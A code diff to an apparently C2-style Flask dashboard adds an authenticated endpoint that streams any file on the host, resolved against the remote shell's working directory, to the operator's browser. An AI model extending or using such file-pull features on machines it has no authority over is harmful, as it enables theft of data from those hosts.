@@ -878,7 +878,43 @@ def server_info():
         "is_root":  (C2_USER == "root" or os.geteuid() == 0),
     })
 
-# ======================== 13c. اختبار ========================
+# ======================== 13c. تحميل ملف من السيرفر ========================
+@app.route("/download_file", methods=["GET"])
+@rate_limit
+@require_auth
+def download_file():
+    """Stream a file from the server to the client (browser download)."""
+    from flask import send_file as flask_send_file
+    path = request.args.get("path", "").strip()
+
+    if not path:
+        return jsonify({"error": "path parameter is required"}), 400
+
+    # Expand ~ and relative paths from current shell CWD
+    if path.startswith("~"):
+        path = os.path.expanduser(path)
+    elif not os.path.isabs(path):
+        path = os.path.join(C2_CWD, path)
+    path = os.path.normpath(path)
+
+    if not os.path.exists(path):
+        return jsonify({"error": f"No such file: {path}"}), 404
+
+    if os.path.isdir(path):
+        return jsonify({"error": f"{path} is a directory, not a file"}), 400
+
+    # Safety: cap at 100 MB
+    size = os.path.getsize(path)
+    if size > 100 * 1024 * 1024:
+        return jsonify({"error": f"File too large ({size // (1024*1024)} MB). Max 100 MB."}), 413
+
+    filename = os.path.basename(path)
+    logger.info(f"📥 File download: {path} ({size} bytes)")
+    save_log_to_db(time.time(), "download", f"[dashboard download] {path} ({size} bytes)", "dashboard")
+
+    return flask_send_file(path, as_attachment=True, download_name=filename)
+
+# ======================== 13d. اختبار ========================
 @app.route("/test_data", methods=["POST"])
 @rate_limit
 def test_data():
